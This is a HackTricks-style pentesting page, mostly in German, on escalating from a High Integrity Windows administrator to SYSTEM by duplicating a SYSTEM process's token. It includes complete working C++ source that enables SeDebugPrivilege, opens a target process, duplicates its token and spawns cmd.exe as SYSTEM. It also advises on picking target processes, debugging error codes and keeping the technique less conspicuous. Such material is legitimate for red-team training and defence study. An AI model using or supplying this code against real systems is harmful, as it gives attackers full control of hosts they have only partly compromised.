# SeImpersonate from High To System

{{#include ../../banners/hacktricks-training.md}}

Diese Seite behandelt die **manuelle** Variante, von einem **High Integrity Administrator process** zu **`NT AUTHORITY\SYSTEM`** zu wechseln, indem ein **nicht geschützter SYSTEM process** geöffnet, dessen token dupliziert und mit diesem token ein Child process gestartet wird.

Wenn du nur **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`** hast, aber **keinen geeigneten SYSTEM process öffnen** kannst, ist der **Potato / named-pipe**-Weg normalerweise zuverlässiger:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

Wenn du nicht nur `SYSTEM`, sondern einen **SYSTEM token mit so vielen Privileges wie möglich** willst, schau dir auch an:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Quick triage

Bevor du versuchst, einen token zu stehlen, prüfe kurz den Kontext:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Praktische Hinweise:

- Ein **High Integrity**-Admin-Token reicht normalerweise aus, um **`SeDebugPrivilege` zu aktivieren** und viele nicht geschützte SYSTEM-Prozesse zu öffnen.
- **`CreateProcessWithTokenW` erfordert `SeImpersonatePrivilege`** beim aufrufenden Prozess. Wenn diese API mit `1314` fehlschlägt, wechsle zu `CreateProcessAsUserW`, nachdem du bereits ein SYSTEM-Primär-Token dupliziert hast.
- Unter modernen Windows-Versionen ist **`lsass.exe` oft ein schlechtes Ziel**, weil **LSA protection / PPL** den Zugriff selbst für Administratoren mit `SeDebugPrivilege` blockiert. Bevorzuge **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** oder ein frühes **`svchost.exe`**, das als SYSTEM läuft.
- Nicht jeder SYSTEM-Prozess hat ein gleichermaßen nützliches Token. Wenn du SYSTEM erhältst, aber fehlende Privilegien bemerkst, probiere einen anderen SYSTEM-Prozess aus, statt anzunehmen, dass die Technik kaputt ist.

## Wähle die PID sorgfältig aus

Der einfachste Weg, das zuverlässig zum Laufen zu bringen, ist, **einen SYSTEM-Prozess zu wählen, dessen DACL Administratoren tatsächlich erlaubt, den Prozess abzufragen und sein Token zu duplizieren**.

Gute Kandidaten zum ersten Testen:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- einige frühe `svchost.exe`-Instanzen, die als SYSTEM laufen

Standardmäßig vermeiden:

- `lsass.exe` auf Hosts, auf denen **RunAsPPL / LSA protection** aktiviert ist
- geschützte / sicherheitskritische Prozesse, die selbst nach dem Aktivieren von `SeDebugPrivilege` `Access denied` zurückgeben

Du kannst Kandidatenprozesse und ihre Token/ACLs mit **Process Explorer** oder **Process Hacker** prüfen, die erhöht ausgeführt werden.

### Code

Der folgende Code stammt von [hier](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Er erlaubt es, **eine Process ID als Argument anzugeben** und eine CMD, **die als der Benutzer** des angegebenen Prozesses läuft, wird gestartet.\
Wenn er in einem High Integrity-Prozess ausgeführt wird, kannst du **die PID eines als System laufenden Prozesses angeben** (wie `winlogon`, `wininit`) und eine `cmd.exe` als SYSTEM ausführen.
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Nützliche API / Zugriffsrechte-Hinweise

Das Sample verwendet `MAXIMUM_ALLOWED`, aber für echte Operationen ist es nützlich, sich die minimalen beteiligten Teile zu merken:

- `OpenProcessToken()` erfordert nur, dass der **process handle** mit **`PROCESS_QUERY_LIMITED_INFORMATION`** geöffnet wurde.
- Um `CreateProcessWithTokenW()` zu verwenden, muss der **primary token handle** **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`** haben.
- `DuplicateTokenEx()` muss einen **primary token** (`TokenPrimary`) erstellen, nicht nur einen impersonation token.
- Wenn du bereits SYSTEM impersoniert hast und `CreateProcessWithTokenW()` trotzdem mit `1314` fehlschlägt, versuche stattdessen `CreateProcessAsUserW()`.

Das bedeutet, dass **das Öffnen des Zielprozesses mit `PROCESS_ALL_ACCESS` normalerweise unnötig und auffälliger ist** als einfach die Rechte anzufordern, die zum Abfragen des Tokens nötig sind.

## Error

Manchmal kann es vorkommen, dass du versuchst, System zu impersonieren, und es nicht funktioniert, wobei eine Ausgabe wie die folgende erscheint:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
Das bedeutet, dass du selbst dann, wenn du auf einem High Integrity-Level läufst, **nicht genügend Berechtigungen** über den Zielprozess/das Ziel-Token hast.\
Lass uns die aktuellen Administrator-Berechtigungen über `svchost.exe`-Prozesse mit **Process Explorer** prüfen (oder du kannst auch **Process Hacker** verwenden):

1. Wähle einen Prozess von `svchost.exe`
2. Rechtsklick --> Properties
3. Im Tab "Security" unten rechts auf die Schaltfläche "Permissions" klicken
4. Auf "Advanced" klicken
5. "Administrators" auswählen und auf "Edit" klicken
6. Auf "Show advanced permissions" klicken

![Code - Error: 6. Click on "Show advanced permissions"](<../../images/image (437).png>)

Das vorherige Bild enthält alle Privilegien, die "Administrators" über den ausgewählten Prozess haben (wie du sehen kannst, haben sie im Fall von `svchost.exe` nur "Query"-Privilegien)

Sieh dir die Privilegien an, die "Administrators" über `winlogon.exe` haben:

![Code - Error: See the privileges "Administrators" have over winlogon.exe](<../../images/image (1102).png>)

Innerhalb dieses Prozesses können "Administrators" "Read Memory" und "Read Permissions" ausführen, was wahrscheinlich erlaubt, das von diesem Prozess verwendete Token zu impersonate.

### Common failure causes

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: the process DACL blocks you, or the target is **protected/PPL**. Pick another SYSTEM process.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: your token handle was opened without enough rights, or the target token DACL prevents duplication.
- **`CreateProcessWithTokenW()` -> `1314`**: the caller doesn't currently have **`SeImpersonatePrivilege`** enabled. Try enabling it first or use `CreateProcessAsUserW()` with the duplicated primary token.
- **`CreateProcessWithTokenW()` -> `1326`** after previous failures: this often just means the earlier token duplication/impersonation step failed, so there is no usable primary token to launch the child process.

## Operator notes

- This technique is great when you are already **local admin + high integrity** and just want a quick, manual path to SYSTEM without spinning up a service or a named-pipe coercion chain.
- On hardened Windows 11 / Server environments, **LSA protection is increasingly common**, so a workflow that assumes `lsass.exe` is always readable is brittle. **`winlogon.exe` / `wininit.exe` / `services.exe` are usually better first picks**.
- If you land in a **service account** context instead of an elevated admin desktop, the **Potato family** is usually a better fit than this page.



## References

- [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [SensePost: Abusing Windows' tokens to compromise Active Directory without touching LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
{{#include ../../banners/hacktricks-training.md}}
